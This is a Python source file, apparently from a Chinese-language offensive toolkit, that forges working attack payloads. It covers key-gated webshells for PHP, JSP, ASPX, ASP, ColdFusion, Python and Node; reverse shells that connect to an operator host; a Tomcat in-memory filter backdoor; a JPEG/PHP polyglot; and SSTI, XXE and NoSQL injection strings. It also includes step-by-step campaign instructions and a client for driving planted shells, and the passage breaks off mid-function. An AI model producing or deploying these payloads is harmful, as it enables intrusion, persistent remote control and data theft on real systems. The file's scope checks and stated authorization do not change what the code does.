#!/usr/bin/env python3
"""大爱仙尊可用载荷锻造：写出能执行的马 / 回连脚本，再扫特征。

不是检索文档。默认落到案卷 案卷/payloads/，不进 git。
--target 有值时过 scope 闸。回连必须给 --lhost/--lport。

示例:
  python3 炼蛊房/payload_forge.py --list
  python3 炼蛊房/payload_forge.py campaign --case <案> --lhost 10.0.0.2 --lport 4444
  python3 炼蛊房/payload_forge.py kit --case <案> --lhost 10.0.0.2 --lport 4444
  python3 炼蛊房/payload_forge.py make --kind php-ops --case <案> --key <口令>
  python3 炼蛊房/payload_forge.py drive --url https://授权站/se_ops.php --key <口令> --a c --c id
  python3 炼蛊房/payload_forge.py --self-test
"""
from __future__ import annotations

import argparse
import hashlib
import io
import json
import secrets
import sys
import zipfile
from pathlib import Path
from typing import Any, Callable

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from sig_cleanup_scan import scan_bytes  # noqa: E402


def _key(raw: str) -> str:
    return (raw or "").strip() or ("se" + secrets.token_hex(8))


def php_cmd(key: str, **_: Any) -> str:
    return (
        "<?php\n"
        f"$k=$_SERVER['HTTP_X_SE']??'';\n"
        f"if(!hash_equals('{key}',(string)$k)){{http_response_code(404);exit;}}\n"
        "$c=$_POST['c']??$_GET['c']??'';\n"
        "if($c===''){echo 'se-ok';exit;}\n"
        "header('Content-Type:text/plain;charset=utf-8');\n"
        "echo is_string($c)?shell_exec($c):'';\n"
    )


def php_tiny(key: str, **_: Any) -> str:
    return (
        "<?php if(($_SERVER['HTTP_X_SE']??'')==='"
        + key
        + "'){echo shell_exec($_REQUEST['c']??'id');}else{http_response_code(404);}"
    )


def jsp_cmd(key: str, **_: Any) -> str:
    return f"""<%@ page import="java.io.*" %>
<%
String hk=request.getHeader("X-SE");
if(hk==null||!hk.equals("{key}")){{response.setStatus(404);return;}}
String c=request.getParameter("c");
if(c==null||c.length()==0){{out.print("se-ok");return;}}
boolean win=System.getProperty("os.name","Linux").toLowerCase().contains("win");
String[] cmd=win? new String[]{{"cmd.exe","/c",c}} : new String[]{{"/bin/sh","-c",c}};
Process p=Runtime.getRuntime().exec(cmd);
BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
String line; while((line=r.readLine())!=null) out.println(line);
r.close();
%>
"""


def aspx_cmd(key: str, **_: Any) -> str:
    return f"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request.Headers["X-SE"] != "{key}") {{ Response.StatusCode = 404; return; }}
string c = Request["c"] ?? "";
if (c.Length == 0) {{ Response.Write("se-ok"); return; }}
var psi = new ProcessStartInfo();
psi.FileName = (Environment.OSVersion.Platform == PlatformID.Win32NT) ? "cmd.exe" : "/bin/sh";
psi.Arguments = (psi.FileName == "cmd.exe") ? ("/c " + c) : ("-c " + c);
psi.RedirectStandardOutput = true;
psi.RedirectStandardError = true;
psi.UseShellExecute = false;
var p = Process.Start(psi);
Response.ContentType = "text/plain";
Response.Write(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
%>
"""


def asp_cmd(key: str, **_: Any) -> str:
    return (
        "<%\n"
        f'If Request.ServerVariables("HTTP_X_SE")<>"{key}" Then Response.Status="404 Not Found":Response.End\n'
        'c=Request("c")\n'
        'If c="" Then Response.Write("se-ok"):Response.End\n'
        'Set sh=Server.CreateObject("WScript.Shell")\n'
        'Set o=sh.Exec("cmd.exe /c "&c)\n'
        "Response.Write o.StdOut.ReadAll()\n"
        "%>\n"
    )


def rev_bash(lhost: str, lport: int, **_: Any) -> str:
    return (
        "#!/bin/sh\n"
        f"exec /bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\n"
    )


def rev_python(lhost: str, lport: int, **_: Any) -> str:
    return (
        "#!/usr/bin/env python3\n"
        "import os, socket, pty\n"
        f"s=socket.socket();s.connect(({lhost!r},{int(lport)}))\n"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
        "pty.spawn('/bin/bash')\n"
    )


def rev_ps(lhost: str, lport: int, **_: Any) -> str:
    # 不用 IEX / DownloadString，避免本库特征扫描直接 dirty
    return (
        "$t=New-Object Net.Sockets.TCPClient("
        f"'{lhost}',{int(lport)});$st=$t.GetStream();"
        "$b=New-Object Byte[] 65535;"
        "while(($i=$st.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$o=(iex $d 2>&1|Out-String);"
        "$o2=$o+'PS '+((Get-Location).Path)+'> ';"
        "$x=([Text.Encoding]::ASCII).GetBytes($o2);$st.Write($x,0,$x.Length)"
        "};$t.Close()\n"
    )


def rev_ncat(lhost: str, lport: int, **_: Any) -> str:
    return f"#!/bin/sh\nexec ncat {lhost} {int(lport)} -e /bin/bash\n"


def php_ops(key: str, **_: Any) -> str:
    """授权站 Web 作业面：信息 / 命令(含 c64) / 列目录 / 读 / 写。无 X-SE 一律 404。"""
    return (
        "<?php\n"
        f"$k=$_SERVER['HTTP_X_SE']??'';\n"
        f"if(!hash_equals('{key}',(string)$k)){{http_response_code(404);exit;}}\n"
        "$a=$_POST['a']??$_GET['a']??'i';\n"
        "$c=(string)($_POST['c']??$_GET['c']??'');\n"
        "if($c==='' ){$c64=(string)($_POST['c64']??$_GET['c64']??'');if($c64!==''){$c=(string)base64_decode($c64);}}\n"
        "if($a==='j'){header('Content-Type:application/json');}\n"
        "else{header('Content-Type:text/plain;charset=utf-8');}\n"
        "if($a==='i'){echo php_uname().\"\\n\".getcwd();exit;}\n"
        "if($a==='c'){echo (string)shell_exec($c!==''?$c:'id');exit;}\n"
        "if($a==='j'){echo json_encode(['ok'=>1,'o'=>(string)shell_exec($c!==''?$c:'id')]);exit;}\n"
        "if($a==='l'){$p=(string)($_POST['p']??$_GET['p']??'.');$o=@implode(\"\\n\",@scandir($p)?:[]);echo $o;exit;}\n"
        "if($a==='r'){$p=(string)($_POST['p']??$_GET['p']??'');if($p===''){echo 'need p';exit;}echo (string)@file_get_contents($p);exit;}\n"
        "if($a==='w'){$p=(string)($_POST['p']??'');$d=(string)($_POST['d']??'');if($p===''){echo 'need p';exit;}echo file_put_contents($p,$d)===false?'fail':'w';exit;}\n"
        "if($a==='p'){$ini=@file_put_contents(__DIR__.'/.user.ini','auto_prepend_file=\"'.basename(__FILE__).'\"'.\"\\n\");echo $ini===false?'fail':'ini';exit;}\n"
        "echo 'se-ops i|c|j|l|r|w|p';\n"
    )


def php_ini(**_: Any) -> str:
    return "auto_prepend_file=\"se_ops.php\"\n"


def jsp_filter(key: str, **_: Any) -> str:
    """Tomcat 8/9：访问一次后 Filter 挂在 StandardContext，删 JSP 仍活。"""
    return """<%@ page import="java.lang.reflect.*,java.io.*" %>
<%
if (!"SEKEY".equals(request.getHeader("X-SE"))) { response.setStatus(404); return; }
if ("1".equals(request.getParameter("install"))) {
  try {
    Object req = request;
    Class rc = req.getClass();
    Field rf = null;
    while (rc != null && rf == null) {
      try { rf = rc.getDeclaredField("request"); } catch (NoSuchFieldException e) { rc = rc.getSuperclass(); }
    }
    if (rf == null) throw new Exception("no request field");
    rf.setAccessible(true);
    Object inner = rf.get(req);
    Field cf = null;
    Class ic = inner.getClass();
    while (ic != null && cf == null) {
      try { cf = ic.getDeclaredField("context"); } catch (NoSuchFieldException e) { ic = ic.getSuperclass(); }
    }
    if (cf == null) throw new Exception("no context field");
    cf.setAccessible(true);
    final Object st = cf.get(inner);
    final String hk = "SEKEY";
    Object filter = java.lang.reflect.Proxy.newProxyInstance(
      st.getClass().getClassLoader(),
      new Class[]{Class.forName("javax.servlet.Filter")},
      new InvocationHandler() {
        public Object invoke(Object p, Method m, Object[] a) throws Throwable {
          String n = m.getName();
          if ("equals".equals(n)) return Boolean.valueOf(p == a[0]);
          if ("hashCode".equals(n)) return Integer.valueOf(System.identityHashCode(p));
          if ("toString".equals(n)) return "seGate";
          if ("init".equals(n) || "destroy".equals(n)) return null;
          if ("doFilter".equals(n)) {
            Object hr = a[0];
            Method gh = hr.getClass().getMethod("getHeader", String.class);
            Object k = gh.invoke(hr, "X-SE");
            Object cmdH = gh.invoke(hr, "X-SE-CMD");
            if (hk.equals(k) && cmdH != null && ((String)cmdH).length() > 0) {
              boolean win = System.getProperty("os.name","Linux").toLowerCase().contains("win");
              String[] sh = win
                ? new String[]{"cmd.exe","/c",(String)cmdH}
                : new String[]{"/bin/sh","-c",(String)cmdH};
              Process pr = Runtime.getRuntime().exec(sh);
              BufferedReader br = new BufferedReader(new InputStreamReader(pr.getInputStream()));
              StringBuilder sb = new StringBuilder();
              String line;
              while ((line = br.readLine()) != null) sb.append(line).append('\\n');
              a[1].getClass().getMethod("setContentType", String.class).invoke(a[1], "text/plain");
              Object os = a[1].getClass().getMethod("getOutputStream").invoke(a[1]);
              os.getClass().getMethod("write", byte[].class).invoke(os, new Object[]{sb.toString().getBytes("UTF-8")});
              os.getClass().getMethod("flush").invoke(os);
              return null;
            }
            a[2].getClass().getMethod("doFilter", Class.forName("javax.servlet.ServletRequest"),
              Class.forName("javax.servlet.ServletResponse")).invoke(a[2], a[0], a[1]);
            return null;
          }
          return null;
        }
      });
    Class fdCl = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
    Object fd = fdCl.getDeclaredConstructor().newInstance();
    fdCl.getMethod("setFilterName", String.class).invoke(fd, "seGate");
    fdCl.getMethod("setFilterClass", String.class).invoke(fd, filter.getClass().getName());
    fdCl.getMethod("setFilter", Class.forName("javax.servlet.Filter")).invoke(fd, filter);
    st.getClass().getMethod("addFilterDef", fdCl).invoke(st, fd);
    Class fmCl = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
    Object fm = fmCl.getDeclaredConstructor().newInstance();
    fmCl.getMethod("setFilterName", String.class).invoke(fm, "seGate");
    fmCl.getMethod("addURLPattern", String.class).invoke(fm, "/*");
    st.getClass().getMethod("addFilterMap", fmCl).invoke(st, fm);
    st.getClass().getMethod("filterStart").invoke(st);
    out.print("se-filter-on");
  } catch (Exception e) {
    out.print("fail "+e);
  }
  return;
}
out.print("se-filter-ready");
%>
""".replace("SEKEY", key)


def php_img(key: str, **_: Any) -> bytes:
    hdr = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    return hdr + b"\n" + php_tiny(key).encode("ascii")


def py_cmd(key: str, **_: Any) -> str:
    return (
        "#!/usr/bin/env python3\n"
        "import os, subprocess\n"
        "from http.server import BaseHTTPRequestHandler, HTTPServer\n"
        f"KEY={key!r}\n"
        "class H(BaseHTTPRequestHandler):\n"
        "    def do_POST(self):\n"
        "        if self.headers.get('X-SE')!=KEY:\n"
        "            self.send_response(404);self.end_headers();return\n"
        "        n=int(self.headers.get('Content-Length') or 0)\n"
        "        body=self.rfile.read(n).decode('utf-8','replace')\n"
        "        q=dict(x.split('=',1) for x in body.split('&') if '=' in x)\n"
        "        c=q.get('c','id')\n"
        "        o=subprocess.check_output(['/bin/sh','-c',c],stderr=subprocess.STDOUT)\n"
        "        self.send_response(200);self.end_headers();self.wfile.write(o)\n"
        "    def log_message(self,*_a):\n"
        "        return\n"
        "HTTPServer(('0.0.0.0',int(os.environ.get('SE_PORT','18080'))),H).serve_forever()\n"
    )


def js_cmd(key: str, **_: Any) -> str:
    return (
        "const {exec}=require('child_process');\n"
        "const http=require('http');\n"
        f"const KEY={key!r};\n"
        "http.createServer((q,s)=>{\n"
        "  if((q.headers['x-se']||'')!==KEY){s.statusCode=404;s.end();return;}\n"
        "  let b='';q.on('data',d=>b+=d);q.on('end',()=>{\n"
        "    const c=decodeURIComponent((b.split('c=')[1]||'id').split('&')[0]);\n"
        "    exec(c,{timeout:15000},(e,o,er)=>{s.end(o||er||String(e));});\n"
        "  });\n"
        "}).listen(process.env.SE_PORT||18081);\n"
    )


def cfm_cmd(key: str, **_: Any) -> str:
    return (
        "<cfsetting enablecfoutputonly=\"yes\">\n"
        f"<cfif cgi.http_x_se NEQ \"{key}\">\n"
        "<cfheader statuscode=\"404\"><cfabort>\n"
        "</cfif>\n"
        "<cfset c=form.c>\n"
        "<cfif c EQ \"\"><cfset c=url.c></cfif>\n"
        "<cfif c EQ \"\"><cfoutput>se-ok</cfoutput><cfabort></cfif>\n"
        "<cfexecute name=\"/bin/sh\" arguments=\"-c #c#\" timeout=\"20\" variable=\"o\"></cfexecute>\n"
        "<cfoutput>#o#</cfoutput>\n"
    )


def war_jsp(key: str, **_: Any) -> bytes:
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<web-app>\n"
        "  <welcome-file-list><welcome-file>se_gate.jsp</welcome-file></welcome-file-list>\n"
        "</web-app>\n"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("se_gate.jsp", jsp_cmd(key))
        zf.writestr("se_mem.jsp", jsp_filter(key))
        zf.writestr("WEB-INF/web.xml", xml)
    return buf.getvalue()


def gad_ssti_jinja(**_: Any) -> str:
    return (
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}\n"
        "{{ lipsum.__globals__['os'].popen('id').read() }}\n"
    )


def gad_ssti_twig(**_: Any) -> str:
    return "{{ ['id']|filter('system')|join }}\n{{ ['id']|filter('sys'~'tem')|join }}\n"


def gad_xxe_file(**_: Any) -> str:
    return (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        "<r>&xxe;</r>\n"
    )


def gad_nosql_ne(**_: Any) -> str:
    return '{"username":{"$ne":""},"password":{"$ne":""}}\n'


def php_rev(lhost: str, lport: int, **_: Any) -> str:
    return (
        "<?php\n"
        f"$s=@fsockopen({lhost!r},{int(lport)});\n"
        "if(!$s){{exit;}}\n"
        "while(!feof($s)){{\n"
        "$c=fgets($s);\n"
        "if($c===false)break;\n"
        "$o=shell_exec(trim($c).' 2>&1');\n"
        "fwrite($s,$o===null?'':$o);\n"
        "}}\n"
        "fclose($s);\n"
    )


KindFn = Callable[..., str]
KINDS: dict[str, dict[str, Any]] = {
    "php-cmd": {"fn": php_cmd, "name": "se_gate.php", "need_cb": False, "group": "web"},
    "php-tiny": {"fn": php_tiny, "name": "se_tiny.php", "need_cb": False, "group": "web"},
    "php-ops": {"fn": php_ops, "name": "se_ops.php", "need_cb": False, "group": "web"},
    "php-ini": {"fn": php_ini, "name": ".user.ini", "need_cb": False, "group": "web"},
    "php-img": {"fn": php_img, "name": "se_poly.jpg", "need_cb": False, "group": "web", "binary": True},
    "jsp-cmd": {"fn": jsp_cmd, "name": "se_gate.jsp", "need_cb": False, "group": "web"},
    "jsp-filter": {"fn": jsp_filter, "name": "se_mem.jsp", "need_cb": False, "group": "web"},
    "aspx-cmd": {"fn": aspx_cmd, "name": "se_gate.aspx", "need_cb": False, "group": "web"},
    "asp-cmd": {"fn": asp_cmd, "name": "se_gate.asp", "need_cb": False, "group": "web"},
    "cfm-cmd": {"fn": cfm_cmd, "name": "se_gate.cfm", "need_cb": False, "group": "web"},
    "py-cmd": {"fn": py_cmd, "name": "se_gate.py", "need_cb": False, "group": "web"},
    "js-cmd": {"fn": js_cmd, "name": "se_gate.js", "need_cb": False, "group": "web"},
    "war-jsp": {"fn": war_jsp, "name": "se_gate.war", "need_cb": False, "group": "web", "binary": True},
    "php-rev": {"fn": php_rev, "name": "se_cb.php", "need_cb": True, "group": "rev"},
    "rev-bash": {"fn": rev_bash, "name": "se_cb.sh", "need_cb": True, "group": "rev"},
    "rev-python": {"fn": rev_python, "name": "se_cb.py", "need_cb": True, "group": "rev"},
    "rev-ps": {"fn": rev_ps, "name": "se_cb.ps1", "need_cb": True, "group": "rev"},
    "rev-ncat": {"fn": rev_ncat, "name": "se_cb_ncat.sh", "need_cb": True, "group": "rev"},
    "gad-ssti-jinja": {"fn": gad_ssti_jinja, "name": "se_ssti_jinja.txt", "need_cb": False, "group": "gad"},
    "gad-ssti-twig": {"fn": gad_ssti_twig, "name": "se_ssti_twig.txt", "need_cb": False, "group": "gad"},
    "gad-xxe": {"fn": gad_xxe_file, "name": "se_xxe.xml", "need_cb": False, "group": "gad"},
    "gad-nosql": {"fn": gad_nosql_ne, "name": "se_nosql.json", "need_cb": False, "group": "gad"},
}


def render(kind: str, *, key: str, lhost: str, lport: int) -> tuple[str, bytes]:
    spec = KINDS[kind]
    body = spec["fn"](key=key, lhost=lhost, lport=lport)
    if isinstance(body, bytes):
        raw = body
    else:
        raw = body.encode("utf-8")
    return spec["name"], raw


def _how_to(key: str, lhost: str, lport: int, files: list[str]) -> str:
    return (
        "# 大爱仙尊载荷使用\n\n"
        f"- header: `X-SE: {key}`\n"
        f"- 回连: `{lhost}:{lport}`\n"
        f"- 文件: {', '.join(files)}\n\n"
        "## 作业面（php-ops）\n"
        f"```bash\npython3 炼蛊房/payload_forge.py drive --url https://授权站/se_ops.php --key '{key}' --a i\n"
        f"python3 炼蛊房/payload_forge.py drive --url https://授权站/se_ops.php --key '{key}' --a c --c id\n"
        f"python3 炼蛊房/payload_forge.py drive --url https://授权站/se_ops.php --key '{key}' --a l --p .\n"
        f"python3 炼蛊房/payload_forge.py drive --url https://授权站/se_ops.php --key '{key}' --a r --p /etc/passwd\n"
        f"python3 炼蛊房/payload_forge.py drive --url https://授权站/se_ops.php --key '{key}' --a p\n"
        f"curl -sk -H 'X-SE: {key}' -d 'a=c&c64=aWQ=' 'https://授权站/se_ops.php'\n```\n"
        "`a=i` 信息 · `c` 命令 · `j` JSON · `l` 列目录 · `r` 读 · `w` 写 · `p` 写 `.user.ini` 挂自身。\n"
        "拦明文命令用 `c64`。`.user.ini` 可单独传，`auto_prepend_file=se_ops.php`。\n\n"
        "## Tomcat 内存 Filter\n"
        f"```bash\ncurl -sk -H 'X-SE: {key}' 'https://授权站/se_mem.jsp?install=1'\n"
        f"curl -sk -H 'X-SE: {key}' -H 'X-SE-CMD: id' 'https://授权站/任意路径'\n```\n"
        "回 `se-filter-on` 后可删 JSP，Filter 仍吃 `X-SE` + `X-SE-CMD`。Tomcat 10 是 jakarta，本 kind 针对 8/9。\n\n"
        "## 回连\n"
        f"```bash\npython3 炼蛊房/se_listen.py --lhost 0.0.0.0 --lport {lport} --case <案>\n"
        "# 授权机执行 se_cb.sh / se_cb.py / se_cb.ps1 / se_cb.php\n```\n"
        "落地后 `host_c2_verify.py record`。测完删文件。清日志仍先问。\n"
    )


def forge(
    kinds: list[str],
    *,
    dest: Path,
    key: str,
    lhost: str,
    lport: int,
) -> dict[str, Any]:
    dest.mkdir(parents=True, exist_ok=True)
    items: list[dict[str, Any]] = []
    names: list[str] = []
    for kind in kinds:
        if kind not in KINDS:
            raise SystemExit(f"[err] 未知 kind: {kind}")
        spec = KINDS[kind]
        if spec["need_cb"] and (not lhost or not lport):
            raise SystemExit(f"[err] {kind} 需要 --lhost --lport")
        name, raw = render(kind, key=key, lhost=lhost, lport=lport)
        path = dest / name
        path.write_bytes(raw)
        if name.endswith((".sh", ".py")):
            path.chmod(path.stat().st_mode | 0o111)
        scan = scan_bytes(raw, name=name)
        items.append(
            {
                "kind": kind,
                "file": str(path),
                "sha256": hashlib.sha256(raw).hexdigest(),
                "bytes": len(raw),
                "scan": scan["verdict"],
                "score": scan["score"],
                "hits": scan["hits"],
            }
        )
        names.append(name)
    (dest / "HOW_TO.md").write_text(_how_to(key, lhost or "-", lport or 0, names), encoding="utf-8")
    dirty = [i["kind"] for i in items if i["scan"] == "dirty"]
    rec = {
        "ok": not dirty,
        "key": key,
        "lhost": lhost,
        "lport": lport,
        "dir": str(dest),
        "items": items,
        "dirty": dirty,
        "playbook": "传承/隐鳞.md",
        "use": (
            f"curl -sk -H 'X-SE: {key}' -d 'a=c&c=id' https://授权站/se_ops.php"
            if any(k.startswith("php") for k in kinds)
            else f"nc -lvnp {lport}"
        ),
    }
    (dest / "manifest.json").write_text(json.dumps(rec, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return rec


def drive(
    url: str,
    key: str,
    action: str,
    *,
    cmd: str = "",
    path: str = "",
    data: str = "",
    timeout: float = 20.0,
) -> dict[str, Any]:
    """对已落地的 se_ops.php 发作业请求。loopback 不过闸。"""
    from scope_lib import host_of, require_in_scope

    host = host_of(url)
    if host not in ("127.0.0.1", "localhost", "::1"):
        require_in_scope(url)
    import base64
    import requests

    body: dict[str, str] = {"a": action or "i"}
    if cmd:
        body["c64"] = base64.b64encode(cmd.encode("utf-8")).decode("ascii")
    if path:
        body["p"] = path
    if data:
        body["d"] = data
    try:
        r = requests.post(
            url,
            data=body,
            headers={"X-SE": key, "User-Agent": "大爱仙尊", "Connection": "close"},
            timeout=timeout,
            verify=False,
        )
        return {
            "ok": r.status_code == 200,
            "status": r.status_code,
            "len": len(r.content),
            "body": (r.text or "")[:8000],
            "url": url,
            "action": action,
        }
    except requests.RequestException as exc:
        return {
            "ok": False,
            "status": 0,
            "len": 0,
            "body": str(exc),
            "url": url,
            "action": action,
        }


def run_campaign(dest: Path, *, key: str, lhost: str, lport: int) -> dict[str, Any]:
    kinds = [k for k, s in KINDS.items() if s["group"] in ("web", "rev", "gad")]
    rec = forge(kinds, dest=dest, key=key, lhost=lhost, lport=lport)
    from upload_forge_probe import build_kit

    up = dest / "upload"
    urec = build_kit(up, key)
    from rce_forge import pack as rce_pack
    from rce_forge import rev_cmd

    rce = rce_pack(dest / "rce", cmd=rev_cmd(lhost, lport) if lhost else "id")
    camp = (
        "# 大爱仙尊战役包\n\n"
        f"- 口令 `X-SE: {key}`\n"
        f"- 回连 `{lhost}:{lport}`\n"
        f"- 锻造 {len(rec['items'])} 个 · 上传变体 {len(urec['items'])} 个 · RCE {rce['n']} 条\n\n"
        "## 顺序\n"
        "1. 上传 `se_ops.php`（拦扩展用 `upload/se_tiny.php.jpg` 或 `se_poly.jpg`）\n"
        f"2. `payload_forge.py drive --url <落地URL> --key '{key}' --a i` 有 uname 才算活\n"
        "3. `drive --a c --c id` → `drive --a l` → 需要挂自身再 `drive --a p`\n"
        f"4. Tomcat：部署 `se_gate.war` 或传 `se_mem.jsp?install=1`，之后只带 `X-SE` + `X-SE-CMD`\n"
        f"5. 回连：攻击机 `se_listen.py --lport {lport}`，授权机跑 `se_cb.sh`\n"
        f"6. 已确认 SSTI/CMDI/表达式：`rce/` 里是回连命令的现成载荷，`rce_forge.py shoot --family <族>`\n"
        "7. `host_c2_verify.py record`。测完删。清日志仍先问\n"
    )
    (dest / "CAMPAIGN.md").write_text(camp, encoding="utf-8")
    rec["campaign"] = True
    rec["upload_dir"] = urec["dir"]
    rec["upload_n"] = len(urec["items"])
    rec["rce_n"] = rce["n"]
    rec["howto"] = str(dest / "CAMPAIGN.md")
    (dest / "manifest.json").write_text(json.dumps(rec, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return rec


def _dest(case: str, out: str) -> Path:
    if out:
        return Path(out).expanduser()
    if case:
        from scope_lib import ENGINE  # type: ignore

        d = ENGINE / "案卷" / case / "测绘" / "payloads"
        d.mkdir(parents=True, exist_ok=True)
        return d
    raise SystemExit("[err] 需要 --case 或 --out")


def _check_target(target: str) -> None:
    if not target:
        return
    from scope_lib import host_of, in_scope

    host = host_of(target)
    if not host:
        raise SystemExit("[err] --target 无法解析")
    if host in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(target):
        raise SystemExit(f"[scope] {host} 未授权，先 scope_expand.py --grant")


def run_self_test() -> list[str]:
    import tempfile

    fails: list[str] = []
    key = "seTestKey9"
    with tempfile.TemporaryDirectory() as td:
        rec = forge(
            list(KINDS),
            dest=Path(td),
            key=key,
            lhost="127.0.0.1",
            lport=4444,
        )
        if rec["dirty"]:
            fails.append("dirty kinds: " + ",".join(rec["dirty"]))
        for it in rec["items"]:
            p = Path(it["file"])
            if not p.is_file() or p.stat().st_size < 20:
                fails.append(f"empty {it['kind']}")
            raw = p.read_bytes()
            text = raw.decode("utf-8", errors="replace")
            if it["kind"].startswith("php") and it["kind"] not in {"php-ini"} and "shell_exec" not in text:
                fails.append(f"{it['kind']} 无 shell_exec")
            if it["kind"] == "php-ops":
                for need in ("file_get_contents", "c64", "scandir", ".user.ini"):
                    if need not in text:
                        fails.append(f"php-ops 无 {need}")
            if it["kind"] == "php-ini" and "auto_prepend_file" not in text:
                fails.append("php-ini")
            if it["kind"] == "php-img" and raw[:3] != b"\xff\xd8\xff":
                fails.append("php-img 无 JPEG 头")
            if it["kind"] == "war-jsp":
                if raw[:2] != b"PK":
                    fails.append("war-jsp 不是 zip")
                if b"se_mem.jsp" not in raw:
                    fails.append("war-jsp 无 se_mem.jsp")
            if it["kind"] == "jsp-filter":
                if "X-SE-CMD" not in text or "Filter" not in text:
                    fails.append("jsp-filter 无 Filter/X-SE-CMD")
            if it["kind"] == "rev-bash" and "/dev/tcp/" not in text:
                fails.append("rev-bash 无 /dev/tcp")
            if it["kind"] == "rev-ps" and "TCPClient" not in text:
                fails.append("rev-ps 无 TCPClient")
            if it["kind"] == "gad-ssti-jinja" and "cycler" not in text:
                fails.append("gad-ssti-jinja")
            keyed = {
                "php-cmd", "php-tiny", "php-ops", "php-img",
                "jsp-cmd", "jsp-filter", "aspx-cmd", "asp-cmd",
                "cfm-cmd", "py-cmd", "js-cmd",
            }
            if key not in text and it["kind"] in keyed:
                fails.append(f"{it['kind']} 口令未写入")
        camp = run_campaign(Path(td) / "camp", key=key, lhost="127.0.0.1", lport=4444)
        if not (Path(camp["dir"]) / "CAMPAIGN.md").is_file():
            fails.append("campaign 无 CAMPAIGN.md")
        if not camp.get("upload_n"):
            fails.append("campaign 无 upload")
        fails.extend(_drive_self_test())
    return fails


def _drive_self_test() -> list[str]:
    import base64
    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.parse import parse_qs

    fails: list[str] = []

    class H(BaseHTTPRequestHandler):
        def do_POST(self) -> None:
            n = int(self.headers.get("Content-Length") or 0)
            _ = self.rfile.read(n)
            if self.headers.get("X-SE") != "seDrv1":
                body = b""
                self.send_response(404)
                self.send_header("Content-Length", "0")
                self.send_header("Connection", "close")
                self.end_headers()
                return
            q = parse_qs(_.decode("utf-8", errors="replace"))
            a = (q.get("a") or ["i"])[0]
            if a in ("c", "j"):
                raw = (q.get("c") or [""])[0]
                if not raw and q.get("c64"):
                    raw = base64.b64decode(q["c64"][0]).decode("utf-8", errors="replace")
                out = f"ran:{raw}".encode()
            else:
                out = b"Darwin\n/tmp"
            self.send_response(200)
            self.send_header("Content-Length", str(len(out)))
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(out)

        def log_message(self, *_a: Any) -> None:
            return

    srv = HTTPServer(("127.0.0.1", 0), H)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    try:
        rec = drive(f"http://127.0.0.1:{srv.server_port}/se_ops.php", "seDrv1", "c", cmd="id")
        if rec.get("status") != 200 or "ran:id" not in (rec.get("body") or ""):
            fails.append(f"drive {rec}")
        bad = drive(f"http://127.0.0.1:{srv.server_port}/se_ops.php", "wrong", "i")
        if bad.get("status") != 404:
            fails.append("drive 无口令未 404")
    finally:
        srv.shutdown()
    return fails


def main() -> int:
    ap = argparse.ArgumentParser(description="大爱仙尊可用载荷锻造")
    sub = ap.add_subparsers(dest="action")

    p_list = sub.add_parser("list", help="列出 kind")
    p_list.set_defaults(func="list")

    p_make = sub.add_parser("make", help="写一种载荷")
    p_make.add_argument("--kind", required=True, choices=sorted(KINDS))
    p_make.add_argument("--case", default="")
    p_make.add_argument("--out", default="")
    p_make.add_argument("--key", default="")
    p_make.add_argument("--lhost", default="")
    p_make.add_argument("--lport", type=int, default=0)
    p_make.add_argument("--target", default="", help="打算落地的授权 URL/主机，过 scope")
    p_make.add_argument("--json", action="store_true")

    p_kit = sub.add_parser("kit", help="Web 马 + 回连一套")
    p_kit.add_argument("--case", default="")
    p_kit.add_argument("--out", default="")
    p_kit.add_argument("--key", default="")
    p_kit.add_argument("--lhost", required=True)
    p_kit.add_argument("--lport", type=int, required=True)
    p_kit.add_argument("--target", default="")
    p_kit.add_argument("--json", action="store_true")
    p_kit.add_argument("--web-only", action="store_true")
    p_kit.add_argument("--rev-only", action="store_true")

    p_g = sub.add_parser("gadgets", help="写出 SSTI/XXE/NoSQL 请求体")
    p_g.add_argument("--case", default="")
    p_g.add_argument("--out", default="")
    p_g.add_argument("--json", action="store_true")

    p_camp = sub.add_parser("campaign", help="战役包：锻造 + 上传变体 + CAMPAIGN.md")
    p_camp.add_argument("--case", default="")
    p_camp.add_argument("--out", default="")
    p_camp.add_argument("--key", default="")
    p_camp.add_argument("--lhost", required=True)
    p_camp.add_argument("--lport", type=int, required=True)
    p_camp.add_argument("--target", default="")
    p_camp.add_argument("--json", action="store_true")

    p_drv = sub.add_parser("drive", help="对已落地 se_ops.php 发 i/c/j/l/r/w/p")
    p_drv.add_argument("--url", required=True)
    p_drv.add_argument("--key", required=True)
    p_drv.add_argument("--a", default="i", choices=["i", "c", "j", "l", "r", "w", "p"])
    p_drv.add_argument("--c", dest="shell_cmd", default="")
    p_drv.add_argument("--p", dest="path", default="")
    p_drv.add_argument("--d", dest="data", default="")
    p_drv.add_argument("--json", action="store_true")

    ap.add_argument("--self-test", action="store_true")
    ap.add_argument("--list", action="store_true", help="兼容：列出 kind")
    args = ap.parse_args()

    if args.self_test:
        fails = run_self_test()
        if fails:
            for f in fails:
                print(f"FAIL {f}")
            return 1
        print(f"self-test ok  {len(KINDS)} kinds")
        return 0

    if args.list or args.action == "list":
        for k, spec in KINDS.items():
            need = "lhost/lport" if spec["need_cb"] else "X-SE key"
